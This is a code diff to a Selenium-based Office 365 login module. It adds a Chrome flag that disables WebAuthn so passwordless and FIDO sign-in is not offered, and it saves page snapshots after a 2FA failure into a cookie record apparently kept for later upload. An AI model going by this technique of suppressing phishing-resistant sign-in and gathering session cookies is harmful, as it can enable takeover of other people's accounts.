@@ -200,6 +200,8 @@ class Office365Module(BaseModule):
         opts.add_argument('--disable-crash-reporter')
         opts.add_argument('--disable-extensions')
         opts.add_argument('--disable-features=SitePerProcess,OptimizationHints')
+        # Disable WebAuthn so Microsoft does not offer password-less/FIDO flows
+        opts.add_argument('--disable-features=WebAuthentication,WebAuthnConditionalUI')
         opts.add_argument('--window-size=1280,800')
         opts.add_argument('--disable-software-rasterizer')
         opts.add_argument('--remote-allow-origins=*')  # fixes chrome 111+ in some envs
@@ -357,10 +359,21 @@ class Office365Module(BaseModule):
             # Save current page HTML & screenshot for offline inspection
             page_path = None
             screenshot_path = None
+            cookies = [{"error": str(e)}]
             try:
                 if 'driver' in locals() and driver:
+                    # First snapshot immediately after failure
                     page_source = driver.page_source
-                    # Always wait a few seconds and capture a second page state
+                    timestamp1 = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
+                    page_path = f'/tmp/o365_2fa_page_{timestamp1}.html'
+                    with open(page_path, 'w', encoding='utf-8') as fp:
+                        fp.write(page_source)
+                    screenshot_path = f'/tmp/o365_2fa_page_{timestamp1}.png'
+                    driver.save_screenshot(screenshot_path)
+                    cookies[0]['page_source'] = page_path
+                    cookies[0]['screenshot'] = screenshot_path
+
+                    # Wait and capture second state
                     time.sleep(6)
                     try:
                         page_source2 = driver.page_source
@@ -370,21 +383,12 @@ class Office365Module(BaseModule):
                             fp.write(page_source2)
                         screenshot_path2 = f'/tmp/o365_2fa_page2_{timestamp2}.png'
                         driver.save_screenshot(screenshot_path2)
-                        # store in cookie dict for upload later
-                        if not cookies:
-                            cookies = [{}]
                         cookies[0]['page_source_wait'] = page_path2
                         cookies[0]['screenshot_wait'] = screenshot_path2
                     except Exception:
                         pass
             except Exception:
-                page_path = None
-                screenshot_path = None
-            cookies = [{
-                "error": str(e),
-                "page_source": page_path or "not captured",
-                "screenshot": screenshot_path or "not captured"
-            }]
+                pass
             self._last_error = tb
         finally:
             try:
